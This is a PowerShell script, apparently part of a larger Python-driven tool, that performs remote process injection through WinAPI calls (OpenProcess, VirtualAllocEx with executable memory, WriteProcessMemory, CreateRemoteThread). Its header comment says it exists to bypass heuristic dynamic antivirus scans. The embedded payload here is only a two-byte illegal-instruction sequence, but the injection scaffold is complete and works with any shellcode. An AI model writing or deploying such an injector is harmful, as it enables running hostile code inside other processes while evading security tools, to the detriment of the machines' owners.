# core/injector.ps1
# This script performs the actual WinAPI injection. 
# It is called by Python to bypass heuristic dynamic scans.

param (
    [int]$targetPid
)

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, int dwCreationFlags, out int lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern int GetLastError();
}
'@

 $hProcess = [WinAPI]::OpenProcess(0x1F0FFF, $false, $targetPid)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "Failed to open the process,error code: $([WinAPI]::GetLastError())"
    exit 1
}

 $addr = [WinAPI]::VirtualAllocEx($hProcess, [IntPtr]::Zero, 2, 0x3000, 0x40)
if ($addr -eq [IntPtr]::Zero) {
    Write-Host "Failed to allocate memory,error code: $([WinAPI]::GetLastError())"
    $null = [WinAPI]::CloseHandle($hProcess)
    exit 1
}

 $shellcode = [byte[]]@(0x0F, 0x0B)
 $bytesWritten = [IntPtr]::Zero
 $null = [WinAPI]::WriteProcessMemory($hProcess, $addr, $shellcode, $shellcode.Length, [ref]$bytesWritten)
if ($bytesWritten.ToInt32() -ne $shellcode.Length) {
    Write-Host "Write failed"
    $null = [WinAPI]::CloseHandle($hProcess)
    exit 1
}

 $threadId = 0
 $null = [WinAPI]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)
if ($threadId -eq 0) {
    Write-Host "Failed to create remote thread,error code: $([WinAPI]::GetLastError())"
    exit 1
} else {
    Write-Host "Remote thread has been created"
}

 $null = [WinAPI]::CloseHandle($hProcess)
exit 0